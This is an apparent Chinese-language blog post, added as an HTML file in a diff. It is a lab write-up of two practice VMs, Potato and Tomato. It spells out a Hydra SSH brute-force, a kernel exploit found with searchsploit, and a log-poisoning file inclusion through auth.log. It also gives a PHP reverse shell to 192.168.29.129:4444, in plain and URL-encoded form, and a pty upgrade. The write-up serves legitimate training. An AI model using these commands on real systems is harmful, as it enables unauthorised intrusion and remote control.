@@ -1,0 +1,238 @@
+
+<!DOCTYPE html>
+<html lang="en" class="loading">
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Potato和Tomato渗透 - 月出从云</title>
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate" />
+    <meta name="keywords" content="Fechin,"> 
+    <meta name="description" content="Potato渗透也是经典的dirb和nmap扫一波
+nmap的结果
+
+dirb的结果
+
+也就发现了一个info.php能用，访问一些是phpinfo，呃，那再看看nmap，开了7120端口，看看，啥,"> 
+    
+    <link rel="alternative" href="atom.xml" title="月出从云" type="application/atom+xml"> 
+    <link rel="icon" href="/img/1.ico"> 
+    
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
+
+    
+<link rel="stylesheet" href="/css/diaspora.css">
+
+	<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+    <script>
+         (adsbygoogle = window.adsbygoogle || []).push({
+              google_ad_client: "ca-pub-8691406134231910",
+              enable_page_level_ads: true
+         });
+    </script>
+    <script async custom-element="amp-auto-ads"
+        src="https://cdn.ampproject.org/v0/amp-auto-ads-0.1.js">
+    </script>
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+<body class="loading">
+    <span id="config-title" style="display:none">月出从云</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <a class="iconfont icon-home image-icon" href="javascript:;" data-url="http://example.com"></a>
+    <div title="播放/暂停" class="iconfont icon-play"></div>
+    <h3 class="subtitle">Potato和Tomato渗透</h3>
+    <div class="social">
+        <div>
+            <div class="share">
+                <a title="获取二维码" class="iconfont icon-scan" href="javascript:;"></a>
+            </div>
+            <div id="qr"></div>
+        </div>
+    </div>
+    <div class="scrollbar"></div>
+</div>
+
+    <div class="section">
+        <div class="article">
+    <div class='main'>
+        <h1 class="title">Potato和Tomato渗透</h1>
+        <div class="stuff">
+            <span>十一月 08, 2020</span>
+            
+
+        </div>
+        <div class="content markdown">
+            <h1 id="Potato渗透"><a href="#Potato渗透" class="headerlink" title="Potato渗透"></a>Potato渗透</h1><p>也是经典的dirb和nmap扫一波</p>
+<p>nmap的结果</p>
+<p><img src="image-20201108210135725.png" alt="image-20201108210135725"></p>
+<p>dirb的结果</p>
+<p><img src="image-20201108210207483.png" alt="image-20201108210207483"></p>
+<p>也就发现了一个info.php能用，访问一些是phpinfo，呃，那再看看nmap，开了7120端口，看看，啥都没有，只能通过hypdra进行爆破咯，呃，账号密码都不知道，只能试试看了</p>
+<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra  192.168.1.113 ssh -s 7120  -L /usr/share/wordlists/rockyou.txt -P /usr/share/wordlists/rockyou.txt -t 4 -v -f</span><br></pre></td></tr></table></figure>
+
+
+
+<p>登陆上之后查看uname -a 查看能不能提权</p>
+<p>看见内核为ubuntu3.多，这种老版本一般可以直接提，尝试搜索</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">potato@ubuntu:/tmp$ uname -a</span><br><span class="line">Linux ubuntu 3.13.0-24-generic #46-Ubuntu SMP Thu Apr 10 19:11:08 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<p>searchsploit Ubuntu 3.13.0</p>
+<p><img src="image-20201109103119279.png" alt="image-20201109103119279"></p>
+<p>利用-p指令找到存放位置，之后我们就可以直接拿下exp了，再上传到靶机的tmp目录下（因为tmp目录大部分情况下是777权限</p>
+<p><img src="image-20201109103447331.png" alt="image-20201109103447331"></p>
+<p>成功拿下！</p>
+<h1 id="Tomato渗透"><a href="#Tomato渗透" class="headerlink" title="Tomato渗透"></a>Tomato渗透</h1><p>首先经典drib和nmap扫一波</p>
+<p><img src="image-20201109103819079.png" alt="image-20201109103819079"></p>
+<p>nmap：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sS -v -T4 -Pn -A -p 0-65535</span><br></pre></td></tr></table></figure>
+
+<p><img src="Potato%E5%92%8CTomato%E6%B8%97%E9%80%8F/image-20201109104128465.png" alt="image-20201109104128465"></p>
+<p>发现8888端口和21，开了其他tcp和ssh的端口,但是都没法用，在info.php下发现文件包含</p>
+<p><img src="image-20201109110118801.png" alt="image-20201109110118801"></p>
+<p>尝试包含了一下etc/passwd就卡住了，不知道该怎么做。。</p>
+<hr>
+<p>这里记录下各个log的文件</p>
+<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">9)/var/run/utmp 记录着现在登录的用户;</span><br><span class="line">10)/var/log/lastlog 记录每个用户最后的登录信息;</span><br><span class="line">11)/var/log/btmp 记录错误的登录尝试;</span><br><span class="line">12)/var/log/dmesg内核日志;</span><br><span class="line">13)/var/log/cpus CPU的处理信息；</span><br><span class="line">14)/var/log/syslog 事件记录监控程序日志；</span><br><span class="line">15)/var/log/auth.log 用户认证日志；</span><br><span class="line">16)/var/log/daemon.log 系统进程日志；</span><br><span class="line">17)/var/log/mail.err 邮件错误信息；</span><br><span class="line"></span><br><span class="line">18)/var/log/mail.info 邮件信息；</span><br><span class="line"></span><br><span class="line">19)/var/log/mail.warn 邮件警告信息；</span><br><span class="line">20)/var/log/daemon.log 系统监控程序产生的信息;</span><br><span class="line">21)/var/log/kern 内核产生的信息;</span><br><span class="line">22)/var/log/lpr   行打印机假脱机系统产生的信息;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>根据大佬的payload，其实我们可以知道，在当前环境下我们可以控制的log文件只有auth.log,因为只有个这个日志我们可以操作，比如我们写入一句话，再进行包含的话，不就是执行了命令了吗（<strong>这个思路真的骚</strong></p>
+<p>所以我们马上操作一波，这里我用xshell脸上·的</p>
+<p><img src="image-20201109113724842.png" alt="image-20201109113724842"></p>
+<p>马上执行命令：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">view-source:http:&#x2F;&#x2F;192.168.29.131&#x2F;antibot_image&#x2F;antibots&#x2F;info.php?image&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;var&#x2F;log&#x2F;auth.log&amp;cmd&#x3D;ls</span><br></pre></td></tr></table></figure>
+
+<p><img src="image-20201109113800161.png" alt="image-20201109113800161"></p>
+<p>再之后为了能够传脚本啥的啊，我们执行一波反弹shell：</p>
+<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r &#x27;$sock=fsockopen(&quot;192.168.29.129&quot;,4444);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>urlencode一下</p>
+<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php%20-r%20&#x27;%24sock%3Dfsockopen(%22192.168.29.129%22%2C4444)%3Bexec(%22%2Fbin%2Fsh%20-i%20%3C%263%20%3E%263%202%3E%263%22)%3B&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>弹到自己本机上即可。</p>
+<p><img src="image-20201109113953687.png" alt="image-20201109113953687"></p>
+<p>接下来我们求一个交互式的shell，发现python3可以用，所以接下来用Python打开一个交互式的shell</p>
+<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br></pre></td></tr></table></figure>
+
+<p>之后uname -a 看内核，exp一冲就完事了</p>
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="false">
+                <source type="audio/mpeg" src="">
+            </audio>
+            
+                <ul id="audio-list" style="display:none">
+                    
+                        
+                            <li title='0' data-url='http://link.hhtjim.com/163/425570952.mp3'></li>
+                        
+                    
+                        
+                            <li title='1' data-url='http://link.hhtjim.com/163/425570952.mp3'></li>
+                        
+                    
+                </ul>
+            
+        </div>
+        
+    <div id='gitalk-container' class="comment link"
+		data-enable='true'
+        data-ae='false'
+        data-ci=''
+        data-cs=''
+        data-r='https://github.com/ysllz/ysllz.github.io'
+        data-o='https://github.com/ysllz/ysllz.github.io'
+        data-a='ysllz'
+        data-d='false'
+    >查看评论</div>
+
+
+    </div>
+    
+        <div class='side'>
+			<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Potato%E6%B8%97%E9%80%8F"><span class="toc-number">1.</span> <span class="toc-text">Potato渗透</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Tomato%E6%B8%97%E9%80%8F"><span class="toc-number">2.</span> <span class="toc-text">Tomato渗透</span></a></li></ol>	
+        </div>
+    
+</div>
+
+
+    </div>
+</div>
+</body>
+
+<script src="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+
+
+<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/typed.js"></script>
+<script src="/js/diaspora.js"></script>
+
+
+<link rel="stylesheet" href="/photoswipe/photoswipe.css">
+<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
+
+
+<script src="/photoswipe/photoswipe.min.js"></script>
+<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
+
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+
+
+</html>
